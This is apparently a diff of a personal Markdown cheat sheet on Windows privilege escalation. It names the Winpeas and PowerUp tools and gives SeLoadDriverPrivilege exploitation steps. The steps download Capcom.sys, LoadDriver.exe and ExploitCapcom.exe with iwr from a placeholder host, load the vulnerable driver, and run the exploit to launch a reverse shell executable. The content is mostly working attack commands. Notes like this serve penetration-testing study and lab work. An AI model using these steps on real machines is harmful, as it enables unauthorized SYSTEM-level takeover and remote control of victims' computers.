@@ -1,6 +1,6 @@
 # Windows Priv Escalation  
-
-
+Winpeas
+PowerUp
 ## Privileges 
 ```
 whoami /priv
@@ -48,10 +48,12 @@ git clone https://github.com/JoshMorrison99/SeLoadDriverPrivilege
 ```
 
 ```
+C:\Tools>
 iwr "http://url:8000/Capcom.sys
 iwr "http://url:8000/LoadDriver.exe"
 iwr "http://url:8000/ExploitCapcom.exe"
-.\LoadDriver.exe System\CurrentControlSet\MyService {C:\Users\Test\Capcom.sys}
+.\LoadDriver.exe System\CurrentControlSet\MyService C:\Tools\Capcom.sys
+.\ExploitCapcom.exe C:\Windows\Place\to\reverseshell\rev.exe
 ```
 
 ```
